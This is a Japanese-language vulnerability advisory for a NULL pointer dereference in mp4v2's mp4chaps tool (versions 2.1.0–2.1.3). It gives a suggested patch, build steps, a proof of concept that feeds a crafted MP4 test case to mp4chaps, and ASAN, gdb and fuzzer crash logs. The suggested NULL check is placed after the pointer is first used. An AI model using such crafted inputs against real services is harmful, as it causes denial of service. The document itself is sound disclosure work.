# mp4v2におけるNULLポインタ参照の脆弱性

## 概要
mp4v2に含まれる、チャプター操作を行うためのツールであるmp4chapsにおいて、NULLポインタ参照によるセグメンテーション違反が発生する。

## 影響を受けるシステム
- mp4v2 v2.1.3
- mp4v2 v2.1.2
- mp4v2 v2.1.1
- mp4v2 v2.1.0

## 詳細情報
深刻度 - 低 (Severity: Low)

mp4v2には、ReadSample()によって正常にsampleを取得できない場合にNULLポインタ参照が発生する脆弱性が存在します。
本脆弱性の原因となる関数は、以下の通りです。
- mp4file.cpp:2662 in MP4File::GetChapters

## 想定される影響
NULLポインタ参照が発生することにより、アプリケーションがサービス運用妨害（DoS）状態となる可能性があります。

## 対策方法
現在、開発者に対してIssueを提起して間もないため、対策例を記します。（対策が入り次第、追記します。）

NULLポインタの判定を挿入し、sampleがNULLポインタの場合は別の処理（条件分岐/例外処理）を入れることを推奨します。

具体的に、src/mp4file.cppの2662行に以下のような条件分岐を入れると、NULLポインタ参照を防止することができます。

```
                  // we know that sample+2 contains the title (sample[0] and sample[1] is the length)
                    const char * title = (const char *)&(sample[2]);
+                  if (sample == NULL) {
+                                        ...
+                     }
                    int titleLen = min((uint32_t)((sample[0] << 8) | sample[1]), (uint32_t)MP4V2_CHAPTER_TITLE_MAX);
                    strncpy(chapters[i].title, title, titleLen);
                    chapters[i].title[titleLen] = 0;
```


## ベンダ情報
[https://github.com/enzo1982/mp4v2/releases/tag/v2.1.3](https://github.com/enzo1982/mp4v2/releases/tag/v2.1.3)


## ビルド例
```
cd /opt
git clone https://github.com/enzo1982/mp4v2.git -b 2.1.3 --depth 1
cd ./mp4v2
mkdir build
cmake -DCMAKE_BUILD_TYPE=Debug ../
cmake --build . -j 10
```

ASANを有効にする場合は、以下のようなオプションをCMakeFiles.txtに追記してください。

```
add_compile_options(-fsanitize=address)
add_link_options(-fsanitize=address)
```

## PoC
テストケースをクローンし、mp4chapsに入力すると、セグメンテーション違反が発生します。

```
git clone https://github.com/mugichiya/pockey.git
cp -r ./pockey/projects/mp4v2_np/testcases .
./mp4chaps --list ./testcases/0000000000.mp4
```

## Log
以下に、発生時のログをいくつか掲載します。

### ASAN
```
banjo@ttc:/tmp/mp4v2/build$ ./mp4chaps --list ./testcases/0000000000.mp4
ReadAtom: "./testcases/0000000000.mp4": invalid atom size, extends outside parent atom - skipping to end of "stbl" "stco" 159384830 vs 1298
AddressSanitizer:DEADLYSIGNAL
=================================================================
==3389808==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f74e82f270b bp 0x7fff39dcd780 sp 0x7fff39dcd5b0 T0)
==3389808==The signal is caused by a READ memory access.
==3389808==Hint: address points to the zero page.
    #0 0x7f74e82f270b in mp4v2::impl::MP4File::GetChapters(MP4Chapter_s**, unsigned int*, MP4ChapterType) /opt/mp4v2/src/mp4file.cpp:2662
    #1 0x7f74e82c1294 in MP4GetChapters /opt/mp4v2/src/mp4.cpp:1647
    #2 0x5620329500df in mp4v2::util::ChapterUtility::actionList(mp4v2::util::Utility::JobContext&) /opt/mp4v2/util/mp4chaps.cpp:182
    #3 0x562032956476 in mp4v2::util::ChapterUtility::utility_job(mp4v2::util::Utility::JobContext&) /opt/mp4v2/util/mp4chaps.cpp:664
    #4 0x7f74e81db528 in mp4v2::util::Utility::job(std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) /opt/mp4v2/libutil/Utility.cpp:298
    #5 0x7f74e81d9626 in mp4v2::util::Utility::batch(int) /opt/mp4v2/libutil/Utility.cpp:105
    #6 0x7f74e81de155 in mp4v2::util::Utility::process_impl() /opt/mp4v2/libutil/Utility.cpp:565
    #7 0x7f74e81dd24e in mp4v2::util::Utility::process() /opt/mp4v2/libutil/Utility.cpp:449
    #8 0x56203295957c in main /opt/mp4v2/util/mp4chaps.cpp:1188
    #9 0x7f74e7823a8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #10 0x7f74e7823b48 in __libc_start_main_impl ../csu/libc-start.c:360
    #11 0x56203294c144 in _start (/opt/mp4v2/build2/mp4chaps+0xf144) (BuildId: 6362905fe8ce5624b29ef2869e210553dee47e65)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /opt/mp4v2/src/mp4file.cpp:2662 in mp4v2::impl::MP4File::GetChapters(MP4Chapter_s**, unsigned int*, MP4ChapterType)
==3389808==ABORTING
```

### Backtrace
```
(gdb) backtrace
#0  0x00007ffff7f31362 in mp4v2::impl::MP4File::GetChapters (
    this=0x55555559a990, chapterList=0x7fffffffcf68,
    chapterCount=0x7fffffffcf5c, fromChapterType=MP4ChapterTypeAny)
    at /opt/mp4v2/src/mp4file.cpp:2662
#1  0x00007ffff7f14d7a in MP4GetChapters (hFile=0x55555559a990,
    chapterList=0x7fffffffcf68, chapterCount=0x7fffffffcf5c,
    fromChapterType=MP4ChapterTypeAny)
    at /opt/mp4v2/src/mp4.cpp:1647
#2  0x000055555555eb45 in mp4v2::util::ChapterUtility::actionList (
    this=0x7fffffffd470, job=...)
    at /opt/mp4v2/util/mp4chaps.cpp:182
#3  0x000055555556166c in mp4v2::util::ChapterUtility::utility_job (
    this=0x7fffffffd470, job=...)
    at /opt/mp4v2/util/mp4chaps.cpp:664
#4  0x00007ffff7e99fb7 in mp4v2::util::Utility::job (this=0x7fffffffd470,
    arg="../build/_mp4-05/default/crashes/id_000000_11")
    at /opt/mp4v2/libutil/Utility.cpp:298
#5  0x00007ffff7e992bc in mp4v2::util::Utility::batch (this=0x7fffffffd470,
    argi=2) at /opt/mp4v2/libutil/Utility.cpp:105
#6  0x00007ffff7e9b2fd in mp4v2::util::Utility::process_impl (
    this=0x7fffffffd470)
    at /opt/mp4v2/libutil/Utility.cpp:565
#7  0x00007ffff7e9adc1 in mp4v2::util::Utility::process (this=0x7fffffffd470)
--Type <RET> for more, q to quit, c to continue without paging--
    at /opt/mp4v2/libutil/Utility.cpp:449
#8  0x0000555555562bf3 in main (argc=3, argv=0x7fffffffde68)
    at /opt/mp4v2/util/mp4chaps.cpp:1188
```


### AFLTriage
```
Summary: CRASH detected in mp4v2::impl::MP4File::GetChapters due to a fault at or near 0x0000000000000000 leading to SIGSEGV (si_signo=11) / SEGV_MAPERR (si_code=1)
Command line: ./build/mp4chaps --list @@
Testcase: ./build/testcases/id_000011_11
Crash bucket: e49d559e538593d64adfc197fae97d79

Crashing thread backtrace:
#0  0x00007ffff7e82fe7 in mp4v2::impl::MP4File::GetChapters (/opt/mp4v2/build/libmp4v2.so.2)
                       2618: MP4ChapterType mp4v2::impl::MP4File::GetChapters(this = (mp4v2::impl::MP4File * const)<optimized out>, chapterList = (MP4Chapter_t **)0x7fffffffcef8, chapterCount = (uint32_t *)0x7fffffffcef4, fromChapterType = (MP4ChapterType)<optimized out>) {
                       ||||:
                       ||||: /* Local reference: uint8_t * sample = 0x0; */
                       ||||: /* Local reference: const char * title = 0x2 <error: Cannot access memory at address 0x2>; */
                       ||||: /* Local reference: int titleLen = <optimized out>; */
                       2660:                     // we know that sample+2 contains the title (sample[0] and sample[1] is the length)
                       2661:                     const char * title = (const char *)&(sample[2]);
                       2662:                     int titleLen = min((uint32_t)((sample[0] << 8) | sample[1]), (uint32_t)MP4V2_CHAPTER_TITLE_MAX);
                       ||||:
                       ----: }
                       at /opt/mp4v2/src/mp4file.cpp:2662

#1  0x00007ffff7e453a2 in MP4GetChapters (/opt/mp4v2/build/libmp4v2.so.2)
                       1642: MP4ChapterType MP4GetChapters(hFile = (MP4FileHandle)<optimized out>, chapterList = (MP4Chapter_t **)<optimized out>, chapterCount = (uint32_t *)<optimized out>, fromChapterType = (MP4ChapterType)<optimized out>) {
                       ||||:
                       ||||: /* Local reference: MP4FileHandle hFile = <optimized out>; */
                       ||||: /* Local reference: MP4Chapter_t ** chapterList = <optimized out>; */
                       ||||: /* Local reference: uint32_t * chapterCount = <optimized out>; */
                       ||||: /* Local reference: MP4ChapterType fromChapterType = <optimized out>; */
                       1645:         if (MP4_IS_VALID_FILE_HANDLE(hFile)) {
                       1646:             try {
                       1647:                 return ((MP4File*)hFile)->GetChapters(chapterList, chapterCount, fromChapterType);
                       ||||:
                       ----: }
                       at /opt/mp4v2/src/mp4.cpp:1647

#2  0x000055555555f192 in mp4v2::util::ChapterUtility::actionList (/opt/mp4v2/build/mp4chaps)
                       170: bool mp4v2::util::ChapterUtility::actionList(this = (mp4v2::util::ChapterUtility * const)0x7fffffffd3c0, job = (mp4v2::util::Utility::JobContext &)@0x7fffffffd200) {
                       |||:
                       |||: /* Local reference: MP4Chapter_t * chapters = 0x0; */
                       |||: /* Local reference: MP4ChapterType chtp = <optimized out>; */
                       |||: /* Local reference: uint32_t chapterCount = 0; */
                       |||: /* Local reference: mp4v2::util::Utility::JobContext & job = @0x7fffffffd200; */
                       180:
                       181:     // get the list of chapters
                       182:     MP4ChapterType chtp = MP4GetChapters(job.fileHandle, &chapters, &chapterCount, _ChapterType);
                       |||:
                       ---: }
                       at /opt/mp4v2/util/mp4chaps.cpp:182

#3  0x00007ffff7d8f356 in mp4v2::util::Utility::job (/opt/mp4v2/build/libmp4v2.so.2)
                       290: bool mp4v2::util::Utility::job(this = (mp4v2::util::Utility * const)0x7fffffffd3c0, arg = (const std::string &)"./build/_mp4-05/default/crashes/id_000011_11") {
                       |||:
                       |||: /* Local reference: bool result = true; */
                       |||: /* Local reference: mp4v2::util::Utility::JobContext job = {file = "./build/_mp4-05/default/crashes/id_000011_11", fileHandle = 0x5555555a6990, optimizeApplicable = false, tofree = empty std::__cxx11::list}; */
                       296:     bool result = FAILURE;
                       297:     try {
                       298:         result = utility_job( job );
                       |||:
                       ---: }
                       at /opt/mp4v2/libutil/Utility.cpp:298

#4  0x00007ffff7d8fb1a in mp4v2::util::Utility::batch (/opt/mp4v2/build/libmp4v2.so.2)
                        92: bool mp4v2::util::Utility::batch(this = (mp4v2::util::Utility * const)0x7fffffffd3c0, argi = (int)<optimized out>) {
                       |||:
                       236:
                       237: 	  _GLIBCXX20_CONSTEXPR
                       238: 	  ~_Guard() { if (_M_guarded) _M_guarded->_M_dispose(); }
                       |||:
                       ---: }
                       at /usr/include/c++/12/bits/basic_string.tcc:238

#5  0x00007ffff7d95980 in mp4v2::util::Utility::process_impl (/opt/mp4v2/build/libmp4v2.so.2)
                       463: bool mp4v2::util::Utility::process_impl(this = (mp4v2::util::Utility * const)0x7fffffffd3c0) {
                       |||:
                       |||: /* Local reference: const bool result = <optimized out>; */
                       563:     }
                       564:
                       565:     const bool result = batch( prog::optind );
                       |||:
                       ---: }
                       at /opt/mp4v2/libutil/Utility.cpp:565

#6  0x00007ffff7d95a6a in mp4v2::util::Utility::process (/opt/mp4v2/build/libmp4v2.so.2)
                       444: bool mp4v2::util::Utility::process(this = (mp4v2::util::Utility * const)0x7fffffffd3c0) {
                       |||:
                       447:
                       448:     try {
                       449:         rv = process_impl();
                       |||:
                       ---: }
                       at /opt/mp4v2/libutil/Utility.cpp:449

#7  0x000055555555b2c0 in main (/opt/mp4v2/build/mp4chaps)
                       1185: int main(argc = (int)<optimized out>, argv = (char **)<optimized out>) {
                       ||||: /* Local reference: mp4v2::util::ChapterUtility util = {<mp4v2::util::Utility> = {_vptr.Utility = 0x5555555769f8 <vtable for mp4v2::util::ChapterUtility+16>, _help = "\nACTIONS\n -l, --list", ' ' <repeats 11 times>, "lis... */
                       ||||: /* Local reference: int argc = <optimized out>; */
                       ||||: /* Local reference: char ** argv = <optimized out>; */
                       1186: {
                       1187:     mp4v2::util::ChapterUtility util( argc, argv );
                       1188:     return util.process();
                       ||||:
                       ----: }
                       at /opt/mp4v2/util/mp4chaps.cpp:1188

Crash context:
/* Register reference: rsi - 0x0000000000000000 (0) */
Execution stopped here ==> 0x00007ffff7e82fe7: movzx  r10d,WORD PTR [rsi]

Register info:
   rax - 0x00000000000003ff (1023)
   rbx - 0x00005555555b4ce0 (93824992627936)
   rcx - 0x0000000000000001 (1)
   rdx - 0x0000000000000000 (0)
   rsi - 0x0000000000000000 (0)
   rdi - 0x00005555555b4ce8 (93824992627944)
   rbp - 0x00005555555b3110 (0x5555555b3110)
   rsp - 0x00007fffffffcdb0 (0x7fffffffcdb0)
    r8 - 0x0000000000000001 (1)
    r9 - 0x000000000000000c (12)
   r10 - 0x00007fffffffce08 (140737488342536)
   r11 - 0x0000000000000206 (518)
   r12 - 0x000000000000000c (12)
   r13 - 0x00007fffffffcdfc (140737488342524)
   r14 - 0x0000000000000007 (7)
   r15 - 0x00007fffffffce10 (140737488342544)
   rip - 0x00007ffff7e82fe7 (0x7ffff7e82fe7 <mp4v2::impl::MP4File::GetChapters(MP4Chapter_s**, unsigned int*, MP4ChapterType)+2183>)
eflags - 0x00010206 ([ PF IF RF ])
    cs - 0x00000033 (51)
    ss - 0x0000002b (43)
    ds - 0x00000000 (0)
    es - 0x00000000 (0)
    fs - 0x00000000 (0)
    gs - 0x00000000 (0)
```


### Syslog
```
2024-09-19T13:22:43.460969+09:00 ttc kernel: [6120809.614047] mp4chaps[454086]: segfault at 0 ip 00007f89894c3362 sp 00007ffd36a50ee0 error 4 in libmp4v2.so.2.1.3[7f8989408000+e6000] likely on CPU 3 (core 1, socket 0)
2024-09-19T13:22:43.461000+09:00 ttc kernel: [6120809.614063] Code: 48 8d 4d 90 48 8d 55 88 8b b5 74 ff ff ff 48 8b 45 b0 48 89 c7 e8 fe 84 f5 ff 48 8b 45 80 48 83 c0 02 48 89 45 c0 48 8b 45 80 <0f> b6 00 0f b6 c0 c1 e0 08 89 c2 48 8b 45 80 48 83 c0 01 0f b6 00
```
